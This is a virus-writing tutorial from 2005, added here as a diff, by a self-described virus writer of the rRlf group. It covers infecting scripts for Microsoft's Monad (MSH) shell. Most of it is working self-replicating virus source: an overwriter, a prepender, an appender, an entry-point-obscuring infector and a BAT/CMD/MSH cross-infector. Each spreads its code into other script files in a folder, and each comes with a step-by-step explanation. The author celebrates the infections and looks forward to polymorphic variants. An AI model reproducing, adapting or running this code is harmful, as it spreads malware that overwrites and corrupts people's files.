@@ -1,0 +1,370 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************    Monad: Microsoft Command Shell    ***********
+          ************         Infection Tutorial           ***********
+          ************                                      ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro Words
+
+  1) File Infection
+     1.1) Overwriting
+     1.2) Prepending
+     1.3) Appending
+     1.4) Entry Point Obscuring
+     1.5) Cross Infection: BAT / CMD / MSH
+
+  2) Last Words
+
+
+
+
+
+
+
+  0) Intro Words
+
+     Monad - Microsoft Command Shell is the next version of CMD.exe and will
+     be used in Microsoft Windows Longhorn. Everybody knows that command.com
+     and CMD.exe had a very small amount of commands, and where therefore
+     nearly useless. Monad will be like Linux's Bash - that means a great
+     number of command and functions. We will be able to make as huge and
+     complex script as we can do it in Linux. As I thought this next step of
+     Microsoft (stealing the ideas of OpenSource Software) should be infected
+     too, I did. It is totally different to the older Command Shell of M$:
+     The objects seems to have a very near connection to C#, the syntax is near
+     to the syntax of bash or PHP. Nevertheless I sat down and tried it, and
+     after ~6 hours after installing I saw my first Overwriter working. I think
+     it is quite funny to infect a future part of Longhorn, which will be
+     released in ~12 months. :D Just for information: I've worked with 
+     Windows Command Shell [6.0.4093.0]. Now, let's more to the real content!
+
+
+
+  1) File Infection
+
+  1.1) Overwriting
+
+       Usually, this topic is not interesting at all, but I think you should
+       see a the sample too, for getting a first idea about that language.
+       The virus overwrites all *.msh files in the current directory:
+
+ - - - - - - - - - - - - - - - [ MSH Overwriter ] - - - - - - - - - - - - - - -
+$name_array=get-childitem *.msh
+foreach ($name in $name_array)
+{
+  if ($name.Length -eq 249)
+  {
+    $my_file=$name.Name
+  }
+}
+
+foreach ($victim in $name_array)
+{
+  if ($name.Length -ne 249)
+  {
+    copy-item $my_file $name.Name
+  }
+}
+ - - - - - - - - - - - - - - - [ MSH Overwriter ] - - - - - - - - - - - - - - -
+
+       The virus works like that:
+       - Getting all *.msh file entries in $name_array
+       - Searchs itself via the filelength
+       - Copy itself to every other *.msh file-name
+
+
+
+
+
+  1.2) Prepending
+
+       This Prepender is now the first real MSH virus. For the following small
+       code I've worked several hours, as there are strange logical problems
+       between normal variables and arrays. But finally I did it, and now you
+       can see the the result. The short description can be found after the
+       code.
+
+ - - - - - - - - - - - - - - - [ MSH Prepender ] - - - - - - - - - - - - - - -
+$name_array=get-childitem *.msh
+# Candela
+foreach ($name in $name_array)
+{
+  $cont=get-content $name.Name
+  if ($cont[1] -eq "# Candela")
+  {
+    $my_name=$name.Name
+  }
+}
+
+$vir_cont=get-content $my_name
+
+foreach ($name in $name_array)
+{
+  $cont=get-content $name.Name
+  if ($cont[1] -ne "# Candela")
+  { 
+    echo $vir_cont[0] >$name.Name
+    for ($i=1; $i -lt 23; $i++) { echo $vir_cont[$i] >>$name.Name }
+    echo $cont >>$name.Name
+  }
+}
+ - - - - - - - - - - - - - - - [ MSH Prepender ] - - - - - - - - - - - - - - -
+
+       It works like that:
+       - Getting *.msh files in the current directory
+       - Searching itself in the files (via Virusstring in the second line)
+       - Reads the whole file's date
+       - Searchs for not infected *.msh files
+       - Writes the 23 viruslines into the file
+       - Writes the victim's content to the file
+
+
+
+
+
+
+  1.3) Appending
+
+       The next important file infection type if the appending file infector.
+       The code is just slight different to the prepending file infection type,
+       so there should be no problem to understand it, if you have already
+       understood the other codes. For this code I did not need very long
+       (~20 mins), so you can see, that this language is not very difficult, if
+       you know, how to work with it. OK, here the code:
+
+ - - - - - - - - - - - - - - - [ MSH Appender ] - - - - - - - - - - - - - - -
+$name_array=get-childitem *.msh
+# Candela
+foreach ($name in $name_array)
+{
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $my_name=$name.Name
+    }
+  }
+}
+
+$vir_cont=get-content $my_name
+foreach ($name in $name_array)
+{
+  $inf=0
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $inf=1
+    }
+  }
+  if ($inf -eq 0)
+  {
+    echo $cont >$name.Name
+    $vir_start=$vir_cont.Length-36
+    for ($i=$vir_start; $i -lt $vir_cont.Length; $i++) 
+    {
+      echo $vir_cont[$i] >>$name.Name
+    }
+  }
+}
+ - - - - - - - - - - - - - - - [ MSH Appender ] - - - - - - - - - - - - - - -
+
+       How does it work:
+       - Searching for *.msh files in the current directory
+       - Searching in every file for a line with the Virusname
+       - Get the name of the current infected file
+       - Get the content of that file
+       - Searchs in every file for a line with the Virusname to get not-infected files
+       - Write the original content to the file
+       - Write the 36 lines (which are at the end of the file) to the file
+
+
+
+
+
+
+  1.4) Entry Point Obscuring
+
+       The last three infection types are very easy to detect and to desinfect.
+       Now comes the first techniqual trick: EPO. The virus infects the file
+       anywhere in the middle. This makes it harder to find, as the whole files
+       have to be checked, not just the beginning and the end of the file. A
+       very hard problem for this beta is, that there is no command for random
+       numbers. There is a command called get-random, but it is just a demo and
+       does not exist in the MSH.exe, but in a DemoCommands.dll. I did not want
+       to use this DemoCommands.dll, as the virus will not work at next betas
+       or at the final version. See the information from cmdletSummary.htm:
+
+get-random (Demo)       Returns a random integer within        get-random [[-max] maximum] 
+                        the integer range specified.           [[-min] minimum]
+
+       I solved that problem in another way: I added the length of all files in
+       files in the current directory, and used the arithmetic operator % for
+       getting a valueable pseudo random number. Everything else should be
+       clear. A shourt summary of the virus after the code.
+
+
+ - - - - - - - - - - - - - - - [ MSH EPO ] - - - - - - - - - - - - - - -
+$name_array=get-childitem *.msh
+# Candela
+foreach ($name in $name_array)
+{
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $my_name=$name.Name
+      $my_position=$i-1
+    }
+  }
+}
+
+$all=get-childitem *.*
+$rnd_num=0
+for ($i=0; $i -lt $all.Length; $i++)
+{
+  $rnd_num+=$all[$i].Length
+}
+
+$vir_cont=get-content $my_name
+foreach ($name in $name_array)
+{
+  $inf=0
+  $cont=get-content $name.Name
+  for ($i=0; $i -lt $cont.Length; $i++)
+  {
+    if ($cont[$i] -eq "# Candela")
+    {
+      $inf=1
+    }
+  }
+  if ($inf -eq 0)
+  {
+    $position=$rnd_num%$cont.Length
+    echo $cont[0] >$name.Name
+    for ($i=1; $i -lt $position; $i++) 
+    {
+      echo $cont[$i] >>$name.Name
+    }
+
+    for ($i=$my_position; $i -lt $my_position+54; $i++) 
+    {
+      echo $vir_cont[$i] >>$name.Name
+    }
+
+    for ($i=$position; $i -lt $cont.Length; $i++) 
+    {
+      echo $cont[$i] >>$name.Name
+    }
+  }
+}
+ - - - - - - - - - - - - - - - [ MSH EPO ] - - - - - - - - - - - - - - -
+
+       Summary of the code above:
+       - Searchs for *.msh files in the current directory
+       - Searchs in every file for the Virusstring
+       - Saves the name of the file and the position of the virus
+       - Searchs for *.* files in the current directory
+       - Adds the filelength of every file
+       - Searchs for a virusstring in every *.msh to get uninfected files
+       - Calculates a valueable random number with $rnd_num%$cont.Length
+       - Writes the first part of the victim to the victim
+       - Writes the virus to the victim
+       - Writes the last part of the victim to the victim
+
+
+
+
+
+  1.5) Cross Infection: BAT / CMD / MSH
+
+       Last code is a cross infector for every Windows Command Line. That means
+       BAT-Files (Win95-98), CMD-Files (WinNT/Win00-WinXP) and MSH-Files
+       (Windows Longhorn [and maybe Blackcomp???]). I've done it without intern
+       code changing while runtime, but all in one code. That means the code
+       for BAT files looks like that one from CMDs and that one from MSH.
+       As you will see now, there were very big problems, as MSH has no
+       more-line command (like /* */), it fails when an error occure (No
+       On Error Resume Next), it checks the content of functions, even they are
+       not executed ect. Anyway, somehow I did it, and you can see it now - 
+       but without summary at the end, as there is nothing more to explain, you
+       just see the (already known) code and the Cross-Infection technique.
+
+
+ - - - - - - - - - - - - - - - [ BAT/CMD/MSH Cross Infector ] - - - - - - - - - - - - - - -
+#Candela
+$Candela=('
+@echo off %Candela%
+rem ','Candela
+%Candela%cls
+rem ','Candela
+find "Candela" <%0 > Candela.bat %Candela% 
+rem ','Candela
+for %%v in (*.bat *.msh *.cmd) do copy Candela.bat+%%v %%v
+rem ','Candela
+del Candela.bat
+rem ','Candela
+goto Candela
+rem ','Candela
+set Candela=1')
+$name_array=get-childitem *.msh    #Candela
+$name_array+=get-childitem *.bat   #Candela
+$name_array+=get-childitem *.cmd   #Candela
+foreach ($name in $name_array) {   #Candela
+  $cont=get-content $name.Name     #Candela
+  if ($cont[0] -eq "#Candela"){
+    $my_name=$name.Name            #Candela
+  } #Candela
+} #Candela
+$vir_cont=get-content $my_name     #Candela
+foreach ($name in $name_array) {   #Candela
+  $cont=get-content $name.Name     #Candela
+  if ($cont[0] -ne "#Candela") {
+    echo $vir_cont[0] >$name.Name  #Candela
+    for ($i=1; $i -lt 34; $i++) { echo $vir_cont[$i] >>$name.Name } #Candela
+    echo $cont >>$name.Name        #Candela
+  } #Candela
+} #Candela
+:Candela
+ - - - - - - - - - - - - - - - [ BAT/CMD/MSH Cross Infector ] - - - - - - - - - - - - - - -
+
+
+
+
+
+
+
+
+  2) Last Words
+
+     I'm too happy that I've finally managed to write this article. Reason:
+     Microsoft Windows Longhorn (or Windows 2006 - as it will be called too)
+     will be released in ~12 months. One sad thing: As there is currently no
+     random-number generator included, it was not possible to write polymorphic
+     engines for it, but someday they will include it, and then it's again time
+     to rock ;) With this article I also wanted to show/tell you, that we are
+     at the beginning of a real good new age. I hope some of you are ready for
+     new discoverment too! :D
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written in July 2005
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - -
